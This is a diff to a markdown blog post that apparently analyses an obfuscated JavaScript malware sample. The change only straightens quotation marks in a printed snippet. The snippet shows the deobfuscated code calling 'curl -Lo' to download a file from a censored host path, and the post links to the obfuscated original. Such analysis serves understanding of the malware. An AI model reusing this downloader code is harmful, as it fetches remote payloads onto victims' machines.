@@ -42,7 +42,7 @@ Our friend was like George, curious, so he reformated the code and found:
 If you want to ~~infect yourself~~ read the code, visit [the github repository](https://gist.github.com/jbrit/9a6525d086411a0fcffea202f368e780#file-initial-obfuscated-iife-js), I take no responsibility for anything though.
 
 ``` javascript
-_0x42b722(“curl -Lo” + _0x157519 + “\” + “http://<censored>/pdown” + “\””, (_0x204dd7, _0x6e1c16, _0x52b515) => {
+_0x42b722("curl -Lo" + _0x157519 + "\" + "http://<censored>/pdown" + "\"", (_0x204dd7, _0x6e1c16, _0x52b515) => {
   if (_0x204dd7) {
     _0x517b73 = 0;
     return void _0x70af27();
